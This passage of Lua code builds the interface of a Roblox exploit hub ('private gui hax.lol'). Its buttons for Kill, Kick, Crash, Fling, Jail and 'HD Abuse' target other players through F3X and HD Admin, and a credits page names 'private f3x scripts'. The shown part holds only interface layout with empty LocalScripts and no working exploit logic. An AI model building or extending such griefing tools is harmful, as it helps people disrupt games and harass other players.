+G2L["265"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["265"]["Size"] = UDim2.new(0, 100, 0, 40);
+G2L["265"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["265"]["Text"] = [[UnFreeze {F3X}]];
+G2L["265"]["Name"] = [[Button]];
+G2L["265"]["Position"] = UDim2.new(0.54698, 0, 0.2922, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+G2L["266"] = Instance.new("LocalScript", G2L["265"]);
+
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button
+G2L["267"] = Instance.new("TextButton", G2L["25f"]);
+G2L["267"]["TextWrapped"] = true;
+G2L["267"]["BorderSizePixel"] = 3;
+G2L["267"]["TextSize"] = 14;
+G2L["267"]["TextScaled"] = true;
+G2L["267"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["267"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["267"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["267"]["Size"] = UDim2.new(0, 100, 0, 40);
+G2L["267"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["267"]["Text"] = [[WalkSpeed 50 {HD}]];
+G2L["267"]["Name"] = [[Button]];
+G2L["267"]["Position"] = UDim2.new(0.78523, 0, 0.2922, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+G2L["268"] = Instance.new("LocalScript", G2L["267"]);
+
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button
+G2L["269"] = Instance.new("TextButton", G2L["25f"]);
+G2L["269"]["TextWrapped"] = true;
+G2L["269"]["BorderSizePixel"] = 3;
+G2L["269"]["TextSize"] = 14;
+G2L["269"]["TextScaled"] = true;
+G2L["269"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["269"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["269"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["269"]["Size"] = UDim2.new(0, 100, 0, 40);
+G2L["269"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["269"]["Text"] = [[R6 {HD}]];
+G2L["269"]["Name"] = [[Button]];
+G2L["269"]["Position"] = UDim2.new(0.05639, 0, 0.45685, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+G2L["26a"] = Instance.new("LocalScript", G2L["269"]);
+
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button
+G2L["26b"] = Instance.new("TextButton", G2L["25f"]);
+G2L["26b"]["TextWrapped"] = true;
+G2L["26b"]["BorderSizePixel"] = 3;
+G2L["26b"]["TextSize"] = 14;
+G2L["26b"]["TextScaled"] = true;
+G2L["26b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["26b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["26b"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["26b"]["Size"] = UDim2.new(0, 100, 0, 40);
+G2L["26b"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["26b"]["Text"] = [[RE {HD}]];
+G2L["26b"]["Name"] = [[Button]];
+G2L["26b"]["Position"] = UDim2.new(0.30404, 0, 0.45685, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+G2L["26c"] = Instance.new("LocalScript", G2L["26b"]);
+
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button
+G2L["26d"] = Instance.new("TextButton", G2L["25f"]);
+G2L["26d"]["TextWrapped"] = true;
+G2L["26d"]["BorderSizePixel"] = 3;
+G2L["26d"]["TextSize"] = 14;
+G2L["26d"]["TextScaled"] = true;
+G2L["26d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["26d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["26d"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["26d"]["Size"] = UDim2.new(0, 100, 0, 40);
+G2L["26d"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["26d"]["Text"] = [[Kill {F3X}]];
+G2L["26d"]["Name"] = [[Button]];
+G2L["26d"]["Position"] = UDim2.new(0.54698, 0, 0.45685, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+G2L["26e"] = Instance.new("LocalScript", G2L["26d"]);
+
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button
+G2L["26f"] = Instance.new("TextButton", G2L["25f"]);
+G2L["26f"]["TextWrapped"] = true;
+G2L["26f"]["BorderSizePixel"] = 3;
+G2L["26f"]["TextSize"] = 14;
+G2L["26f"]["TextScaled"] = true;
+G2L["26f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["26f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["26f"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["26f"]["Size"] = UDim2.new(0, 100, 0, 40);
+G2L["26f"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["26f"]["Text"] = [[Kick {HD}]];
+G2L["26f"]["Name"] = [[Button]];
+G2L["26f"]["Position"] = UDim2.new(0.78523, 0, 0.45685, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+G2L["270"] = Instance.new("LocalScript", G2L["26f"]);
+
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button
+G2L["271"] = Instance.new("TextButton", G2L["25f"]);
+G2L["271"]["TextWrapped"] = true;
+G2L["271"]["BorderSizePixel"] = 3;
+G2L["271"]["TextSize"] = 14;
+G2L["271"]["TextScaled"] = true;
+G2L["271"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["271"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["271"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["271"]["Size"] = UDim2.new(0, 100, 0, 40);
+G2L["271"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["271"]["Text"] = [[Jail {HD}]];
+G2L["271"]["Name"] = [[Button]];
+G2L["271"]["Position"] = UDim2.new(0.05639, 0, 0.62877, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+G2L["272"] = Instance.new("LocalScript", G2L["271"]);
+
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button
+G2L["273"] = Instance.new("TextButton", G2L["25f"]);
+G2L["273"]["TextWrapped"] = true;
+G2L["273"]["BorderSizePixel"] = 3;
+G2L["273"]["TextSize"] = 14;
+G2L["273"]["TextScaled"] = true;
+G2L["273"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["273"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["273"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["273"]["Size"] = UDim2.new(0, 100, 0, 40);
+G2L["273"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["273"]["Text"] = [[UnJail {HD}]];
+G2L["273"]["Name"] = [[Button]];
+G2L["273"]["Position"] = UDim2.new(0.30404, 0, 0.62877, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+G2L["274"] = Instance.new("LocalScript", G2L["273"]);
+
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button
+G2L["275"] = Instance.new("TextButton", G2L["25f"]);
+G2L["275"]["TextWrapped"] = true;
+G2L["275"]["BorderSizePixel"] = 3;
+G2L["275"]["TextSize"] = 14;
+G2L["275"]["TextScaled"] = true;
+G2L["275"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["275"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["275"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["275"]["Size"] = UDim2.new(0, 100, 0, 40);
+G2L["275"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["275"]["Text"] = [[Crash {HD}]];
+G2L["275"]["Name"] = [[Button]];
+G2L["275"]["Position"] = UDim2.new(0.54698, 0, 0.62877, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+G2L["276"] = Instance.new("LocalScript", G2L["275"]);
+
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button
+G2L["277"] = Instance.new("TextButton", G2L["25f"]);
+G2L["277"]["TextWrapped"] = true;
+G2L["277"]["BorderSizePixel"] = 3;
+G2L["277"]["TextSize"] = 14;
+G2L["277"]["TextScaled"] = true;
+G2L["277"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["277"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["277"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["277"]["Size"] = UDim2.new(0, 100, 0, 40);
+G2L["277"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["277"]["Text"] = [[Fling {HD}]];
+G2L["277"]["Name"] = [[Button]];
+G2L["277"]["Position"] = UDim2.new(0.78523, 0, 0.62877, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button.LocalScript
+G2L["278"] = Instance.new("LocalScript", G2L["277"]);
+
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.TextLabel
+G2L["279"] = Instance.new("TextLabel", G2L["25f"]);
+G2L["279"]["TextWrapped"] = true;
+G2L["279"]["TextStrokeTransparency"] = 0;
+G2L["279"]["BorderSizePixel"] = 0;
+G2L["279"]["TextSize"] = 14;
+G2L["279"]["TextScaled"] = true;
+G2L["279"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["279"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["279"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["279"]["Size"] = UDim2.new(0, 407, 0, 14);
+G2L["279"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["279"]["Text"] = [[Page Inspired By 1sw0rd1's Gui]];
+G2L["279"]["Position"] = UDim2.new(0.20063, 0, 0.95157, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button
+G2L["27a"] = Instance.new("TextButton", G2L["25f"]);
+G2L["27a"]["TextWrapped"] = true;
+G2L["27a"]["BorderSizePixel"] = 3;
+G2L["27a"]["TextSize"] = 14;
+G2L["27a"]["TextScaled"] = true;
+G2L["27a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["27a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["27a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["27a"]["Size"] = UDim2.new(0, 100, 0, 40);
+G2L["27a"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["27a"]["Text"] = [[Bald {F3X}]];
+G2L["27a"]["Name"] = [[Button]];
+G2L["27a"]["Position"] = UDim2.new(0.05639, 0, 0.79342, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button
+G2L["27b"] = Instance.new("TextButton", G2L["25f"]);
+G2L["27b"]["TextWrapped"] = true;
+G2L["27b"]["BorderSizePixel"] = 3;
+G2L["27b"]["TextSize"] = 14;
+G2L["27b"]["TextScaled"] = true;
+G2L["27b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["27b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["27b"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["27b"]["Size"] = UDim2.new(0, 100, 0, 40);
+G2L["27b"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["27b"]["Text"] = [[Explode {HD}]];
+G2L["27b"]["Name"] = [[Button]];
+G2L["27b"]["Position"] = UDim2.new(0.30404, 0, 0.79342, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button
+G2L["27c"] = Instance.new("TextButton", G2L["25f"]);
+G2L["27c"]["TextWrapped"] = true;
+G2L["27c"]["BorderSizePixel"] = 3;
+G2L["27c"]["TextSize"] = 14;
+G2L["27c"]["TextScaled"] = true;
+G2L["27c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["27c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["27c"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["27c"]["Size"] = UDim2.new(0, 100, 0, 40);
+G2L["27c"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["27c"]["Text"] = [[Empty]];
+G2L["27c"]["Name"] = [[Button]];
+G2L["27c"]["Position"] = UDim2.new(0.54698, 0, 0.79342, 0);
+
+
+-- StarterGui.private gui hax.lol.ScriptHub F3X Page.Button
+G2L["27d"] = Instance.new("TextButton", G2L["25f"]);
+G2L["27d"]["TextWrapped"] = true;
+G2L["27d"]["BorderSizePixel"] = 3;
+G2L["27d"]["TextSize"] = 14;
+G2L["27d"]["TextScaled"] = true;
+G2L["27d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["27d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["27d"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["27d"]["Size"] = UDim2.new(0, 100, 0, 40);
+G2L["27d"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["27d"]["Text"] = [[Empty]];
+G2L["27d"]["Name"] = [[Button]];
+G2L["27d"]["Position"] = UDim2.new(0.78523, 0, 0.79342, 0);
+
+
+-- StarterGui.private gui hax.lol.Credit tab Page
+G2L["27e"] = Instance.new("Frame", G2L["2"]);
+G2L["27e"]["Visible"] = false;
+G2L["27e"]["BorderSizePixel"] = 3;
+G2L["27e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["27e"]["Size"] = UDim2.new(0, 639, 0, 413);
+G2L["27e"]["Position"] = UDim2.new(0.00156, 0, 0.18056, 0);
+G2L["27e"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["27e"]["Name"] = [[Credit tab Page]];
+
+
+-- StarterGui.private gui hax.lol.Credit tab Page.TextLabel
+G2L["27f"] = Instance.new("TextLabel", G2L["27e"]);
+G2L["27f"]["TextWrapped"] = true;
+G2L["27f"]["BorderSizePixel"] = 0;
+G2L["27f"]["TextSize"] = 14;
+G2L["27f"]["TextScaled"] = true;
+G2L["27f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["27f"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["27f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["27f"]["BackgroundTransparency"] = 1;
+G2L["27f"]["Size"] = UDim2.new(0, 343, 0, 55);
+G2L["27f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["27f"]["Text"] = [[Gui By: @Elv4r0x | Scripts & Guis, Audios: @Picklelover @Skyl0rd @snakeGod (and alot of people eh idk who but imma credit to them)]];
+G2L["27f"]["Position"] = UDim2.new(0.01095, 0, 0.01695, 0);
+
+
+-- StarterGui.private gui hax.lol.Credit tab Page.TextLabel
+G2L["280"] = Instance.new("TextLabel", G2L["27e"]);
+G2L["280"]["TextWrapped"] = true;
+G2L["280"]["BorderSizePixel"] = 0;
+G2L["280"]["TextSize"] = 14;
+G2L["280"]["TextScaled"] = true;
+G2L["280"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["280"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["280"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["280"]["BackgroundTransparency"] = 1;
+G2L["280"]["Size"] = UDim2.new(0, 327, 0, 48);
+G2L["280"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["280"]["Text"] = [[Instant F3X Method Decal Spam By: @yoid AKA nexlius (didn't taked the yoid's one but i remake it myself)]];
+G2L["280"]["Position"] = UDim2.new(0.02347, 0, 0.17918, 0);
+
+
+-- StarterGui.private gui hax.lol.Credit tab Page.TextLabel
+G2L["281"] = Instance.new("TextLabel", G2L["27e"]);
+G2L["281"]["TextWrapped"] = true;
+G2L["281"]["BorderSizePixel"] = 0;
+G2L["281"]["TextSize"] = 14;
+G2L["281"]["TextScaled"] = true;
+G2L["281"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["281"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["281"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["281"]["BackgroundTransparency"] = 1;
+G2L["281"]["Size"] = UDim2.new(0, 346, 0, 36);
+G2L["281"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["281"]["Text"] = [[HD F3X SkyBox Method By: @noah1337 or @nexlius idk]];
+G2L["281"]["Position"] = UDim2.new(0.01095, 0, 0.32203, 0);
+
+
+-- StarterGui.private gui hax.lol.Credit tab Page.TextLabel
+G2L["282"] = Instance.new("TextLabel", G2L["27e"]);
+G2L["282"]["TextWrapped"] = true;
+G2L["282"]["BorderSizePixel"] = 0;
+G2L["282"]["TextSize"] = 14;
+G2L["282"]["TextScaled"] = true;
+G2L["282"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["282"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["282"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["282"]["BackgroundTransparency"] = 1;
+G2L["282"]["Size"] = UDim2.new(0, 343, 0, 34);
+G2L["282"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["282"]["Text"] = [[UI Gui & Pages Inspired By: 1sw0rd1's F3X Gui]];
+G2L["282"]["Position"] = UDim2.new(0.00782, 0, 0.4092, 0);
+
+
+-- StarterGui.private gui hax.lol.Credit tab Page.TextLabel
+G2L["283"] = Instance.new("TextLabel", G2L["27e"]);
+G2L["283"]["TextWrapped"] = true;
+G2L["283"]["BorderSizePixel"] = 0;
+G2L["283"]["TextSize"] = 14;
+G2L["283"]["TextScaled"] = true;
+G2L["283"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["283"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["283"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["283"]["BackgroundTransparency"] = 1;
+G2L["283"]["Size"] = UDim2.new(0, 216, 0, 98);
+G2L["283"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["283"]["Text"] = [[Thank You For using the Gui! more addons will be added in the future ]];
+G2L["283"]["Position"] = UDim2.new(0.02973, 0, 0.74818, 0);
+
+
+-- StarterGui.private gui hax.lol.Credit tab Page.TextLabel
+G2L["284"] = Instance.new("TextLabel", G2L["27e"]);
+G2L["284"]["TextWrapped"] = true;
+G2L["284"]["BorderSizePixel"] = 0;
+G2L["284"]["TextSize"] = 14;
+G2L["284"]["TextScaled"] = true;
+G2L["284"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["284"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["284"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["284"]["BackgroundTransparency"] = 1;
+G2L["284"]["Size"] = UDim2.new(0, 160, 0, 96);
+G2L["284"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["284"]["Text"] = [[(this Gui contains many private f3x scripts)]];
+G2L["284"]["Position"] = UDim2.new(0.37715, 0, 0.74818, 0);
+
+
+-- StarterGui.private gui hax.lol.Credit tab Page.ImageLabel
+G2L["285"] = Instance.new("ImageLabel", G2L["27e"]);
+G2L["285"]["BorderSizePixel"] = 0;
+G2L["285"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["285"]["Image"] = [[rbxassetid://103432880185377]];
+G2L["285"]["Size"] = UDim2.new(0, 250, 0, 248);
+G2L["285"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["285"]["BackgroundTransparency"] = 1;
+G2L["285"]["Position"] = UDim2.new(0.55712, 0, 0.01695, 0);
+
+
+-- StarterGui.private gui hax.lol.Credit tab Page.TextLabel
+G2L["286"] = Instance.new("TextLabel", G2L["27e"]);
+G2L["286"]["TextWrapped"] = true;
+G2L["286"]["BorderSizePixel"] = 0;
+G2L["286"]["TextSize"] = 14;
+G2L["286"]["TextScaled"] = true;
+G2L["286"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["286"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["286"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["286"]["BackgroundTransparency"] = 1;
+G2L["286"]["Size"] = UDim2.new(0, 343, 0, 34);
+G2L["286"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["286"]["Text"] = [[Close n open btn reference to: @cZerkidd's V3 F3X Gui]];
+G2L["286"]["Position"] = UDim2.new(0.00782, 0, 0.50605, 0);
+
+
+-- StarterGui.private gui hax.lol.Credit tab Page.TextLabel
+G2L["287"] = Instance.new("TextLabel", G2L["27e"]);
+G2L["287"]["TextWrapped"] = true;
+G2L["287"]["BorderSizePixel"] = 0;
+G2L["287"]["TextSize"] = 14;
+G2L["287"]["TextScaled"] = true;
+G2L["287"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["287"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["287"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["287"]["BackgroundTransparency"] = 1;
+G2L["287"]["Size"] = UDim2.new(0, 206, 0, 38);
+G2L["287"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["287"]["Text"] = [[all GUIs & F3X UIs Credited to the real people (lazy to tell the names)]];
+G2L["287"]["Position"] = UDim2.new(0.65728, 0, 0.90799, 0);
+
+
+-- StarterGui.private gui hax.lol.Credit tab Page.TextLabel
+G2L["288"] = Instance.new("TextLabel", G2L["27e"]);
+G2L["288"]["TextWrapped"] = true;
+G2L["288"]["BorderSizePixel"] = 0;
+G2L["288"]["TextSize"] = 14;
+G2L["288"]["TextScaled"] = true;
+G2L["288"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["288"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["288"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["288"]["BackgroundTransparency"] = 1;
+G2L["288"]["Size"] = UDim2.new(0, 279, 0, 38);
+G2L["288"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["288"]["Text"] = [[localplayer stuffs some of it are by Voidcore aka @InnocentPlayer]];
+G2L["288"]["Position"] = UDim2.new(0.00626, 0, 0.61743, 0);
+
+
+-- StarterGui.private gui hax.lol.Credit tab Page.TextLabel
+G2L["289"] = Instance.new("TextLabel", G2L["27e"]);
+G2L["289"]["TextWrapped"] = true;
+G2L["289"]["BorderSizePixel"] = 0;
+G2L["289"]["TextSize"] = 14;
+G2L["289"]["TextScaled"] = true;
+G2L["289"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["289"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["289"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["289"]["BackgroundTransparency"] = 1;
+G2L["289"]["Size"] = UDim2.new(0, 279, 0, 38);
+G2L["289"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["289"]["Text"] = [[HD particles org by @r04dbl0ck1ng | HD particles enhanced by @Elv4r0x]];
+G2L["289"]["Position"] = UDim2.new(0.482, 0, 0.61743, 0);
+
+
+-- StarterGui.private gui hax.lol.Credit tab Page.TextLabel
+G2L["28a"] = Instance.new("TextLabel", G2L["27e"]);
+G2L["28a"]["TextWrapped"] = true;
+G2L["28a"]["BorderSizePixel"] = 0;
+G2L["28a"]["TextSize"] = 14;
+G2L["28a"]["TextScaled"] = true;
+G2L["28a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["28a"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["28a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["28a"]["BackgroundTransparency"] = 1;
+G2L["28a"]["Size"] = UDim2.new(0, 204, 0, 38);
+G2L["28a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["28a"]["Text"] = [[delete hd workspace script by roadblocking again]];
+G2L["28a"]["Position"] = UDim2.new(0.6385, 0, 0.76513, 0);
+
+
+-- StarterGui.private gui hax.lol.Credit tab
+G2L["28b"] = Instance.new("TextButton", G2L["2"]);
+G2L["28b"]["TextWrapped"] = true;
+G2L["28b"]["BorderSizePixel"] = 3;
+G2L["28b"]["TextSize"] = 14;
+G2L["28b"]["TextScaled"] = true;
+G2L["28b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["28b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["28b"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["28b"]["Size"] = UDim2.new(0, 50, 0, 35);
+G2L["28b"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["28b"]["Text"] = [[Credit Tab]];
+G2L["28b"]["Name"] = [[Credit tab]];
+G2L["28b"]["Position"] = UDim2.new(0.91875, 0, 0.09325, 0);
+
+
+-- StarterGui.private gui hax.lol.Credit tab.LocalScript
+G2L["28c"] = Instance.new("LocalScript", G2L["28b"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab
+G2L["28d"] = Instance.new("TextButton", G2L["2"]);
+G2L["28d"]["TextWrapped"] = true;
+G2L["28d"]["BorderSizePixel"] = 3;
+G2L["28d"]["TextSize"] = 14;
+G2L["28d"]["TextScaled"] = true;
+G2L["28d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["28d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["28d"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["28d"]["Size"] = UDim2.new(0, 58, 0, 35);
+G2L["28d"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["28d"]["Text"] = [[HD Abuse 2 / More F3Xs]];
+G2L["28d"]["Name"] = [[HD Abuse 2 tab]];
+G2L["28d"]["Position"] = UDim2.new(0.74219, 0, 0.09325, 0);
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab.LocalScript
+G2L["28e"] = Instance.new("LocalScript", G2L["28d"]);
+
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page
+G2L["28f"] = Instance.new("Frame", G2L["2"]);
+G2L["28f"]["Visible"] = false;
+G2L["28f"]["BorderSizePixel"] = 3;
+G2L["28f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["28f"]["Size"] = UDim2.new(0, 640, 0, 413);
+G2L["28f"]["Position"] = UDim2.new(0, 0, 0.18056, 0);
+G2L["28f"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["28f"]["Name"] = [[HD Abuse 2 tab Page]];
+
+
+-- StarterGui.private gui hax.lol.HD Abuse 2 tab Page.ScrollSkyAnimate
+G2L["290"] = Instance.new("ScrollingFrame", G2L["28f"]);
+G2L["290"]["Active"] = true;
+G2L["290"]["BorderSizePixel"] = 3;
